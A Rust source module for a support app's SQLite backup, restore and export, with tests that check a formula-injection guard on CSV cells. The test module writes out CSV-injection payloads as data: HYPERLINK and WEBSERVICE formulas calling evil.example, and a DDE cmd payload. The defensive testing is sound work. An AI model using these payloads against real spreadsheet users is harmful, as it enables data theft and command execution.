use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Mutex;

use rusqlite::Connection;
use serde::Serialize;
use serde_json::{Value, json};

use crate::crypto;
use crate::error::{Error, Result};

#[derive(Serialize)]
pub struct BackupResult {
    pub ok: bool,
    pub message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub verified: Option<bool>,
}

fn now_iso() -> String {
    chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Millis, true)
}

fn stamp() -> String {
    now_iso().replace([':', '.'], "-")
}

static VERIFY_CACHE: Mutex<Option<HashMap<String, (u64, bool)>>> = Mutex::new(None);

fn cached_verify(full_path: &Path) -> bool {
    let Ok(meta) = fs::metadata(full_path) else {
        return false;
    };
    let Ok(modified) = meta.modified() else {
        return false;
    };
    let mtime = modified
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);
    let key = full_path.to_string_lossy().into_owned();
    let mut guard = VERIFY_CACHE.lock().unwrap_or_else(|p| p.into_inner());
    let cache = guard.get_or_insert_with(HashMap::new);
    if let Some((m, v)) = cache.get(&key)
        && *m == mtime
    {
        return *v;
    }
    let verified = verify_backup(full_path);
    cache.insert(key, (mtime, verified));
    verified
}

pub fn verify_backup(backup_path: &Path) -> bool {
    Connection::open_with_flags(backup_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)
        .and_then(|test| test.query_row("PRAGMA integrity_check", [], |r| r.get::<_, String>(0)))
        .map(|v| v == "ok")
        .unwrap_or(false)
}

pub fn backup(conn: &Connection, backups_dir: &Path) -> BackupResult {
    try_backup(conn, backups_dir).unwrap_or_else(|e| BackupResult {
        ok: false,
        message: format!("Backup failed: {e}"),
        path: None,
        verified: None,
    })
}

fn try_backup(conn: &Connection, backups_dir: &Path) -> Result<BackupResult> {
    fs::create_dir_all(backups_dir)?;
    let stamp = stamp();
    let target = backups_dir.join(format!("supportos-backup-{stamp}.db"));
    let escaped = target.to_string_lossy().replace('\'', "''");
    conn.execute_batch(&format!("VACUUM INTO '{escaped}'"))?;
    // Audit fix (M12): the backup is the full mirror database in plaintext
    // (customer PII included). VACUUM INTO inherits the umask (0644);
    // force owner-only like secrets.key.
    crypto::restrict_permissions(&target);

    // Audit fix (M18): only the file EXTENSION may change here. The
    // pre-fix `to_string_lossy().replace(".db", ".settings.json")`
    // rewrote EVERY ".db" occurrence, so a data directory containing
    // ".db" anywhere in its path (e.g. …/my.db.d/backups) produced a
    // sidecar path inside a nonexistent directory and failed the whole
    // backup. with_extension touches the final component only (and
    // appends honestly if the name carried no extension at all).
    let settings_target = target.with_extension("settings.json");
    let mut safe_rows: Vec<Value> = Vec::new();
    {
        let mut stmt = conn.prepare("SELECT key, value FROM application_settings")?;
        let rows = stmt.query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?)))?;
        for (key, value) in rows.flatten() {
            let secret_like = ["token", "secret", "password"]
                .iter()
                .any(|pat| key.to_lowercase().contains(pat));
            if !secret_like {
                safe_rows.push(json!({"key": key, "value": value}));
            }
        }
    }
    fs::write(
        &settings_target,
        serde_json::to_string_pretty(&json!({
            "version": 1,
            "exported_at": now_iso(),
            "settings": safe_rows,
        }))?,
    )?;
    // Audit fix (M12): the sidecar is secret-redacted but still carries
    // application settings; keep it owner-only alongside the .db.
    crypto::restrict_permissions(&settings_target);

    let size = fs::metadata(&target)?.len();
    let verified = verify_backup(&target);
    Ok(BackupResult {
        ok: true,
        message: format!("Backup created ({:.1} MB).", size as f64 / 1024.0 / 1024.0),
        path: Some(target.to_string_lossy().into_owned()),
        verified: Some(verified),
    })
}

pub fn list_backups(backups_dir: &Path) -> Vec<Value> {
    let mut out: Vec<(String, Value)> = Vec::new();
    let Ok(entries) = fs::read_dir(backups_dir) else {
        return Vec::new();
    };
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().into_owned();
        if !name.ends_with(".db") {
            continue;
        }
        let Ok(meta) = entry.metadata() else { continue };
        let Ok(modified) = meta.modified() else {
            continue;
        };
        let created_at = modified
            .duration_since(std::time::UNIX_EPOCH)
            .ok()
            .and_then(|d| {
                chrono::DateTime::<chrono::Utc>::from_timestamp(
                    d.as_secs() as i64,
                    d.subsec_nanos(),
                )
            })
            .map(|t| t.to_rfc3339_opts(chrono::SecondsFormat::Millis, true))
            .unwrap_or_default();
        let verified = cached_verify(&entry.path());
        out.push((
            created_at.clone(),
            json!({
                "file": name,
                "size_bytes": meta.len(),
                "created_at": created_at,
                "verified": verified,
            }),
        ));
    }
    out.sort_by_key(|(k, _)| std::cmp::Reverse(k.clone()));
    out.into_iter().map(|(_, v)| v).collect()
}

pub fn prune_backups(backups_dir: &Path, keep: usize) -> usize {
    let Ok(entries) = fs::read_dir(backups_dir) else {
        return 0;
    };
    let mut files: Vec<(std::time::SystemTime, PathBuf, String)> = entries
        .flatten()
        .filter(|e| e.file_name().to_string_lossy().ends_with(".db"))
        .filter_map(|e| {
            let mtime = e.metadata().ok()?.modified().ok()?;
            Some((
                mtime,
                e.path(),
                e.file_name().to_string_lossy().into_owned(),
            ))
        })
        .collect();
    files.sort_by_key(|(t, _, _)| std::cmp::Reverse(*t));
    let mut removed = 0;
    for (_, path, name) in files.iter().skip(keep.max(1)) {
        let _ = fs::remove_file(path);
        let sidecar = name.strip_suffix(".db").unwrap_or(name).to_string() + ".settings.json";
        let _ = fs::remove_file(backups_dir.join(sidecar));
        removed += 1;
    }
    removed
}

/// Structural probe for a restore source: a SupportOS database always
/// carries the base-schema `app_state` table. A foreign-but-valid SQLite
/// file (an export from some other tool, a half-copied unrelated `.db`)
/// would pass a bare integrity check yet brick the app once swapped in,
/// so it is refused before anything on disk is touched.
fn looks_like_supportos_db(path: &Path) -> bool {
    Connection::open_with_flags(path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)
        .and_then(|conn| {
            conn.query_row(
                "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='app_state'",
                [],
                |r| r.get::<_, i64>(0),
            )
        })
        .map(|n| n > 0)
        .unwrap_or(false)
}

pub fn restore(db_path: &Path, backup_path: &Path) -> Value {
    if !backup_path.exists() {
        return json!({ "ok": false, "message": "Backup file not found." });
    }
    // Audit item 11: never swap an unverified file over the live
    // database. The integrity check catches truncated copies and
    // non-databases; the structural probe catches foreign SQLite files.
    // Both run BEFORE anything on disk is modified.
    if !verify_backup(backup_path) {
        return json!({
            "ok": false,
            "message": "Restore refused: the backup file failed its integrity check. \
                         The live database was not touched."
        });
    }
    if !looks_like_supportos_db(backup_path) {
        return json!({
            "ok": false,
            "message": "Restore refused: the file is a database, but not a SupportOS \
                         backup. The live database was not touched."
        });
    }
    if let Some(parent) = db_path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    let db_str = db_path.to_string_lossy();
    let restore_tmp = format!("{db_str}.restore-tmp");
    let prev = format!("{db_str}.restore-prev");
    // Stage the verified copy and fsync it BEFORE anything is swapped,
    // so a power cut cannot leave a half-written file in place.
    if fs::copy(backup_path, &restore_tmp).is_err() {
        return json!({ "ok": false, "message": "Restore failed: could not stage the backup." });
    }
    if fs::File::open(&restore_tmp)
        .and_then(|f| f.sync_all())
        .is_err()
    {
        let _ = fs::remove_file(&restore_tmp);
        return json!({ "ok": false, "message": "Restore failed: could not flush the staged backup." });
    }
    // A stale prev from an earlier restore must not block the rename.
    let _ = fs::remove_file(&prev);
    let _ = fs::remove_file(format!("{prev}-wal"));
    let _ = fs::remove_file(format!("{prev}-shm"));
    // Move the LIVE database and its WAL/SHM aside as one unit. This
    // closes the stale-WAL window: the previous code renamed the new
    // database into place first and only then deleted the old `-wal`,
    // so a crash in between would have paired the fresh file with the
    // old WAL and replayed foreign pages onto it. With the live side
    // moved first, between the renames the db path simply does not
    // exist — SQLite treats that as "open fresh", never as a
    // cross-generation pair.
    if db_path.exists() && fs::rename(db_path, &prev).is_err() {
        let _ = fs::remove_file(&restore_tmp);
        return json!({
            "ok": false,
            "message": "Restore failed: could not set the live database aside."
        });
    }
    for ext in ["-wal", "-shm"] {
        let live = format!("{db_str}{ext}");
        if Path::new(&live).exists() {
            let _ = fs::rename(&live, format!("{prev}{ext}"));
        }
    }
    if fs::rename(&restore_tmp, db_path).is_err() {
        // Roll back: the live database (and its WAL) return to place.
        if Path::new(&prev).exists() {
            let _ = fs::rename(&prev, db_path);
        }
        for ext in ["-wal", "-shm"] {
            let side = format!("{prev}{ext}");
            if Path::new(&side).exists() {
                let _ = fs::rename(&side, format!("{db_str}{ext}"));
            }
        }
        return json!({ "ok": false, "message": "Restore failed: could not swap the database into place." });
    }
    // Durability: fsync the swapped file and the directory entry that
    // now names it.
    let _ = fs::File::open(db_path).and_then(|f| f.sync_all());
    if let Some(parent) = db_path.parent() {
        let _ = fs::File::open(parent).and_then(|d| d.sync_all());
    }
    // Success: the pre-restore database is discarded along with its
    // moved-aside WAL/SHM (the backup file itself remains on disk).
    let _ = fs::remove_file(&prev);
    let _ = fs::remove_file(format!("{prev}-wal"));
    let _ = fs::remove_file(format!("{prev}-shm"));
    json!({ "ok": true, "message": "Database restored. Restart SupportOS to use the restored data." })
}

pub fn export_json(conn: &Connection, backups_dir: &Path) -> Value {
    try_export_json(conn, backups_dir)
        .unwrap_or_else(|e| json!({ "ok": false, "message": format!("Export failed: {e}") }))
}

fn try_export_json(conn: &Connection, backups_dir: &Path) -> Result<Value> {
    fs::create_dir_all(backups_dir)?;
    let target = backups_dir.join(format!(
        "supportos-export-{}.json",
        chrono::Utc::now().timestamp_millis()
    ));
    let mut data = serde_json::Map::new();
    for table in [
        "conversations",
        "customers",
        "organizations",
        "known_issues",
        "issue_clusters",
        "knowledge_documents",
        "ai_drafts",
    ] {
        let exists: bool = conn
            .query_row(
                "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name = ?1",
                [table],
                |r| r.get::<_, i64>(0),
            )
            .map(|n| n > 0)
            .unwrap_or(false);
        if !exists {
            data.insert(table.to_string(), Value::Array(Vec::new()));
            continue;
        }
        let has_deleted_at: bool = {
            let count: i64 = conn
                .query_row(
                    &format!("SELECT COUNT(*) FROM pragma_table_info('{table}') WHERE name = 'deleted_at'"),
                    [],
                    |r| r.get(0),
                )
                .unwrap_or(0);
            count > 0
        };
        let sql = if has_deleted_at {
            format!("SELECT * FROM {table} WHERE deleted_at IS NULL")
        } else {
            format!("SELECT * FROM {table}")
        };
        let mut stmt = conn.prepare(&sql)?;
        let col_names: Vec<String> = stmt
            .column_names()
            .into_iter()
            .map(|s| s.to_string())
            .collect();
        let rows = stmt.query_map([], |r| {
            let mut obj = serde_json::Map::new();
            for (i, name) in col_names.iter().enumerate() {
                let v: Value = match r.get_ref(i)? {
                    rusqlite::types::ValueRef::Null => Value::Null,
                    rusqlite::types::ValueRef::Integer(n) => json!(n),
                    rusqlite::types::ValueRef::Real(f) => json!(f),
                    rusqlite::types::ValueRef::Text(t) => {
                        json!(String::from_utf8_lossy(t).into_owned())
                    }
                    rusqlite::types::ValueRef::Blob(b) => {
                        json!(b.iter().map(|x| format!("{x:02x}")).collect::<String>())
                    }
                };
                obj.insert(name.clone(), v);
            }
            Ok(Value::Object(obj))
        })?;
        let collected: Vec<Value> = rows.flatten().collect();
        data.insert(table.to_string(), Value::Array(collected));
    }
    fs::write(
        &target,
        serde_json::to_string_pretty(&json!({
            "version": 1,
            "exported_at": now_iso(),
            "data": data,
        }))?,
    )?;
    // Audit fix (M12): JSON exports contain full customer records (PII);
    // owner-only instead of the umask's 0644.
    crypto::restrict_permissions(&target);
    Ok(json!({
        "ok": true,
        "message": "JSON export created. Note: this export contains customer data - handle it carefully.",
        "path": target.to_string_lossy(),
    }))
}

/// Clean-audit item 106: the CSV export lacked a formula-injection guard.
/// A cell that starts with a formula trigger (`=`, `+`, `-`, `@`, TAB,
/// CR — the OWASP CSV-injection set) executes when the exported file is
/// opened in a spreadsheet: a conversation subject like
/// `=HYPERLINK("http://evil","click")` became a live formula on the
/// analyst's desk. The guard prefixes those cells with a single quote,
/// which spreadsheet apps render as inert text, then applies the normal
/// CSV quoting on top.
fn csv_cell(v: &Option<String>) -> String {
    let raw = v.as_deref().unwrap_or("");
    let guarded = if raw.starts_with(['=', '+', '-', '@', '\t', '\r']) {
        format!("'{raw}")
    } else {
        raw.to_string()
    };
    let s = guarded.replace('"', "\"\"");
    if s.contains('"') || s.contains(',') || s.contains('\n') {
        format!("\"{s}\"")
    } else {
        s
    }
}

pub fn export_conversations_csv(conn: &Connection, backups_dir: &Path) -> Value {
    try_export_csv(conn, backups_dir)
        .unwrap_or_else(|e| json!({ "ok": false, "message": format!("Export failed: {e}") }))
}

fn try_export_csv(conn: &Connection, backups_dir: &Path) -> Result<Value> {
    fs::create_dir_all(backups_dir)?;
    let target = backups_dir.join(format!(
        "supportos-conversations-{}.csv",
        chrono::Utc::now().timestamp_millis()
    ));
    let conv_has_deleted_at: bool = {
        let count: i64 = conn
            .query_row(
                "SELECT COUNT(*) FROM pragma_table_info('conversations') WHERE name = 'deleted_at'",
                [],
                |r| r.get(0),
            )
            .unwrap_or(0);
        count > 0
    };
    let dnc_filter = if conv_has_deleted_at {
        " WHERE c.deleted_at IS NULL"
    } else {
        ""
    };
    let sql = format!(
        "SELECT c.number, c.subject, c.status, m.name AS mailbox,
             TRIM(COALESCE(cu.first_name,'') || ' ' || COALESCE(cu.last_name,'')) AS customer,
             cu.email AS email, c.created_at AS created_at, c.closed_at
           FROM conversations c LEFT JOIN customers cu ON cu.id = c.customer_local_id
           LEFT JOIN mailboxes m ON m.id = c.mailbox_local_id{dnc_filter}"
    );
    let header = [
        "number",
        "subject",
        "status",
        "mailbox",
        "customer",
        "email",
        "created_at",
        "closed_at",
    ];
    let mut stmt = match conn.prepare(&sql) {
        Ok(s) => s,
        Err(e) => return Err(Error::Sqlite(e)),
    };
    let rows = stmt.query_map([], |r| {
        Ok((
            r.get::<_, Option<i64>>(0)?,
            r.get::<_, Option<String>>(1)?,
            r.get::<_, Option<String>>(2)?,
            r.get::<_, Option<String>>(3)?,
            r.get::<_, Option<String>>(4)?,
            r.get::<_, Option<String>>(5)?,
            r.get::<_, Option<String>>(6)?,
            r.get::<_, Option<String>>(7)?,
        ))
    })?;
    let esc = |v: &Option<String>| -> String { csv_cell(v) };
    let mut lines = vec![header.join(",")];
    for row in rows.flatten() {
        let values = [
            row.0.map(|n| n.to_string()),
            row.1,
            row.2,
            row.3,
            row.4,
            row.5,
            row.6,
            row.7,
        ];
        lines.push(values.iter().map(esc).collect::<Vec<_>>().join(","));
    }
    fs::write(&target, lines.join("\n"))?;
    // Audit fix (M12): the CSV export carries customer names/emails (PII).
    crypto::restrict_permissions(&target);
    Ok(json!({
        "ok": true,
        "message": "CSV export created. Note: this export contains customer data.",
        "path": target.to_string_lossy(),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "spp-backup-test-{tag}-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_millis()
        ));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).expect("temp dir");
        dir
    }

    fn conn_with_settings() -> Connection {
        let conn = Connection::open_in_memory().expect("in-memory connection");
        conn.execute_batch(
            "CREATE TABLE application_settings (
                key   TEXT PRIMARY KEY,
                value TEXT NOT NULL
            );
            INSERT INTO application_settings (key, value) VALUES ('theme', 'dark');
            INSERT INTO application_settings (key, value) VALUES ('api_token', 'hunter2');
            INSERT INTO application_settings (key, value) VALUES ('webhook_secret', 's3cr3t');",
        )
        .expect("settings schema");
        conn
    }

    #[test]
    fn backup_creates_verified_db_and_redacted_sidecar() {
        let dir = temp_dir("backup");
        let conn = conn_with_settings();

        let result = backup(&conn, &dir);
        assert!(result.ok, "backup failed: {}", result.message);
        assert_eq!(result.verified, Some(true));
        let db_path = PathBuf::from(result.path.expect("backup path"));
        assert!(db_path.exists());

        // The .db backup is a full copy: all three settings rows survive.
        let check =
            Connection::open_with_flags(&db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)
                .expect("open backup");
        let rows: i64 = check
            .query_row("SELECT COUNT(*) FROM application_settings", [], |r| {
                r.get(0)
            })
            .expect("count settings");
        assert_eq!(rows, 3);

        // The .settings.json sidecar redacts secret-like keys (token/secret/password).
        let sidecar = db_path.with_extension("settings.json");
        let raw = fs::read_to_string(&sidecar).expect("sidecar readable");
        let parsed: Value = serde_json::from_str(&raw).expect("sidecar JSON");
        let settings = parsed["settings"].as_array().expect("settings array");
        assert_eq!(settings.len(), 1, "only non-secret keys are exported");
        assert_eq!(settings[0]["key"], "theme");

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn verify_backup_rejects_non_database_files() {
        let dir = temp_dir("verify");
        let junk = dir.join("junk.db");
        fs::write(&junk, b"this is not a sqlite database at all").expect("write junk");
        assert!(!verify_backup(&junk));
        let _ = fs::remove_dir_all(&dir);
    }

    /// Audit fix (M18): the settings sidecar path must be derived from the
    /// file extension only. The pre-fix code did
    /// `path.replace(".db", ".settings.json")`, which rewrote EVERY
    /// ".db" occurrence — a backups directory whose own path contained
    /// ".db" pointed the sidecar at a nonexistent directory and failed
    /// the whole backup.
    #[test]
    fn audit_m18_sidecar_path_survives_a_directory_named_with_db() {
        let root = temp_dir("m18");
        let dir = root.join("my.db.d");
        fs::create_dir_all(&dir).expect("backups dir containing '.db'");
        let conn = conn_with_settings();

        let result = backup(&conn, &dir);
        assert!(
            result.ok,
            "a '.db' in the directory name must not break the backup: {}",
            result.message
        );
        let db_path = PathBuf::from(result.path.expect("backup path"));
        assert!(db_path.exists());
        // The sidecar sits beside the .db with exactly the extension swapped.
        let sidecar = db_path.with_extension("settings.json");
        assert!(
            sidecar.exists(),
            "the .settings.json sidecar must be written next to the .db"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn restore_swaps_database_and_removes_wal_shm() {
        let dir = temp_dir("restore");
        let source = dir.join("source.db");
        let conn = Connection::open(&source).expect("source db");
        conn.execute_batch(
            "CREATE TABLE app_state (id INTEGER PRIMARY KEY, schema_version INTEGER);
             INSERT INTO app_state (id, schema_version) VALUES (1, 42);
             CREATE TABLE marker (id INTEGER PRIMARY KEY, note TEXT);
             INSERT INTO marker (note) VALUES ('restorable');",
        )
        .expect("source data");
        let backup_path = dir.join("backup.db");
        conn.execute_batch(&format!(
            "VACUUM INTO '{}'",
            backup_path.to_string_lossy().replace('\'', "''")
        ))
        .expect("vacuum into");

        let target = dir.join("target.db");
        // Pre-existing WAL/SHM files must be cleaned up by the restore.
        fs::write(dir.join("target.db-wal"), b"stale").expect("wal");
        fs::write(dir.join("target.db-shm"), b"stale").expect("shm");

        let result = restore(&target, &backup_path);
        assert_eq!(result["ok"], json!(true));
        assert!(target.exists());
        assert!(!dir.join("target.db-wal").exists());
        assert!(!dir.join("target.db-shm").exists());
        // Audit item 11: no staging or previous-generation residue may
        // outlive a successful restore.
        assert!(!dir.join("target.db.restore-tmp").exists());
        assert!(!dir.join("target.db.restore-prev").exists());
        assert!(!dir.join("target.db.restore-prev-wal").exists());
        assert!(!dir.join("target.db.restore-prev-shm").exists());

        let check =
            Connection::open_with_flags(&target, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)
                .expect("restored db");
        let note: String = check
            .query_row("SELECT note FROM marker", [], |r| r.get(0))
            .expect("marker row");
        assert_eq!(note, "restorable");

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn restore_reports_missing_backup() {
        let dir = temp_dir("restore-missing");
        let result = restore(&dir.join("new.db"), &dir.join("nope.db"));
        assert_eq!(result["ok"], json!(false));
        assert!(result["message"].as_str().unwrap().contains("not found"));
        let _ = fs::remove_dir_all(&dir);
    }

    /// Audit item 11: an unverified file (junk / truncated copy) must be
    /// refused before the live database is touched.
    #[test]
    fn restore_refuses_an_unverified_file_and_keeps_the_live_db() {
        let dir = temp_dir("restore-junk");
        let target = dir.join("target.db");
        let conn = Connection::open(&target).expect("live db");
        conn.execute_batch(
            "CREATE TABLE app_state (id INTEGER PRIMARY KEY, schema_version INTEGER);
             INSERT INTO app_state (id, schema_version) VALUES (1, 7);
             CREATE TABLE marker (id INTEGER PRIMARY KEY, note TEXT);
             INSERT INTO marker (note) VALUES ('live data');",
        )
        .expect("live data");
        drop(conn);
        let junk = dir.join("junk.db");
        fs::write(&junk, b"this is not a sqlite database at all").expect("junk");

        let result = restore(&target, &junk);
        assert_eq!(result["ok"], json!(false));
        assert!(result["message"].as_str().unwrap().contains("integrity"));

        // The live database is untouched and still opens with its data.
        let check =
            Connection::open_with_flags(&target, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)
                .expect("live db opens");
        let note: String = check
            .query_row("SELECT note FROM marker", [], |r| r.get(0))
            .expect("marker row");
        assert_eq!(note, "live data");
        assert!(!dir.join("target.db.restore-tmp").exists());
        let _ = fs::remove_dir_all(&dir);
    }

    /// Audit item 11: a VALID SQLite file that is not a SupportOS backup
    /// passes integrity_check — the structural probe is what must catch
    /// it before the swap.
    #[test]
    fn restore_refuses_a_foreign_sqlite_database() {
        let dir = temp_dir("restore-foreign");
        let target = dir.join("target.db");
        let live = Connection::open(&target).expect("live db");
        live.execute_batch(
            "CREATE TABLE app_state (id INTEGER PRIMARY KEY, schema_version INTEGER);
             INSERT INTO app_state (id, schema_version) VALUES (1, 7);
             CREATE TABLE marker (id INTEGER PRIMARY KEY, note TEXT);
             INSERT INTO marker (note) VALUES ('live data');",
        )
        .expect("live data");
        drop(live);
        let foreign = dir.join("foreign.db");
        let other = Connection::open(&foreign).expect("foreign db");
        other
            .execute_batch(
                "CREATE TABLE totally_unrelated (payload TEXT);
                 INSERT INTO totally_unrelated (payload) VALUES ('hi');",
            )
            .expect("foreign data");
        drop(other);

        let result = restore(&target, &foreign);
        assert_eq!(result["ok"], json!(false));
        assert!(
            result["message"]
                .as_str()
                .unwrap()
                .contains("not a SupportOS")
        );

        let check =
            Connection::open_with_flags(&target, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)
                .expect("live db opens");
        let note: String = check
            .query_row("SELECT note FROM marker", [], |r| r.get(0))
            .expect("marker row");
        assert_eq!(note, "live data");
        assert!(!dir.join("target.db.restore-tmp").exists());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn prune_keeps_newest_and_removes_sidecars() {
        let dir = temp_dir("prune");
        let mut kept_name = String::new();
        for (i, mtime) in [100_u64, 200, 300].into_iter().enumerate() {
            let name = format!("supportos-backup-{i}.db");
            let path = dir.join(&name);
            fs::write(&path, b"x").expect("write backup");
            let file = fs::File::options().write(true).open(&path).expect("open");
            file.set_modified(std::time::UNIX_EPOCH + std::time::Duration::from_secs(mtime))
                .expect("mtime");
            let sidecar = dir.join(format!("supportos-backup-{i}.settings.json"));
            fs::write(&sidecar, b"{}").expect("write sidecar");
            if i == 2 {
                kept_name = name;
            }
        }

        let removed = prune_backups(&dir, 1);
        assert_eq!(removed, 2);

        let remaining: Vec<String> = fs::read_dir(&dir)
            .expect("read dir")
            .flatten()
            .filter(|e| e.file_name().to_string_lossy().ends_with(".db"))
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .collect();
        assert_eq!(remaining, vec![kept_name]);
        // Sidecars of pruned backups are removed; the kept one survives.
        assert!(dir.join("supportos-backup-2.settings.json").exists());
        assert!(!dir.join("supportos-backup-0.settings.json").exists());
        assert!(!dir.join("supportos-backup-1.settings.json").exists());

        let _ = fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod batch29_audit106_tests {
    use super::*;

    fn csv_temp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "spp-csv-guard-{tag}-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_millis()
        ));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).expect("temp dir");
        dir
    }

    /// Clean-audit item 106: the CSV export must carry the formula-injection
    /// guard — a conversation subject that starts with a formula trigger
    /// (= + - @ TAB CR) is prefixed with a single quote so a spreadsheet
    /// renders inert text, while ordinary cells pass through unchanged.
    #[test]
    fn audit106_csv_export_neutralizes_formula_cells() {
        let dir = csv_temp_dir("csv-guard");
        let mut conn = Connection::open_in_memory().expect("db");
        crate::bootstrap::apply_all(&mut conn).expect("migrations");
        for (remote, number, subject) in [
            (
                9501i64,
                95i64,
                "=HYPERLINK(\"http://evil.example\",\"click me\")",
            ),
            (9502, 96, "+SUM(A1:A9)"),
            (9503, 97, "@WEBSERVICE(\"http://evil.example/collect?p=\")"),
            (9504, 98, "-2+cmd|'/c calc'!A0"),
            (9505, 99, "Ordinary refund question"),
        ] {
            conn.execute(
                "INSERT INTO conversations (remote_id, number, subject, status)
                 VALUES (?1, ?2, ?3, 'active')",
                rusqlite::params![remote, number, subject],
            )
            .expect("conversation");
        }
        let out = export_conversations_csv(&conn, &dir);
        assert!(
            out.get("ok")
                .and_then(serde_json::Value::as_bool)
                .unwrap_or(false),
            "export failed: {out}"
        );
        let path = PathBuf::from(out.get("path").and_then(|v| v.as_str()).expect("path"));
        let text = fs::read_to_string(&path).expect("csv text");
        // CSV quoting doubles inner quotes inside a quoted field; the guard
        // prefix must sit INSIDE the quoted cell.
        assert!(
            text.contains("\"'=HYPERLINK(\"\"http://evil.example\"\",\"\"click me\"\")\""),
            "the = cell must be quote-prefixed: {text}"
        );
        assert!(
            text.contains("'+SUM(A1:A9)"),
            "the + cell must be quote-prefixed: {text}"
        );
        assert!(
            text.contains("\"'@WEBSERVICE(\"\"http://evil.example/collect?p=\"\")\""),
            "the @ cell must be quote-prefixed: {text}"
        );
        assert!(
            text.contains("'-2+cmd|'/c calc'!A0"),
            "the - cell must be quote-prefixed: {text}"
        );
        assert!(
            text.contains(",Ordinary refund question,"),
            "ordinary cells pass through unchanged: {text}"
        );
        assert!(
            !text.contains("\n=HYPERLINK"),
            "no raw formula may start a cell: {text}"
        );
        let _ = fs::remove_dir_all(&dir);
    }
}
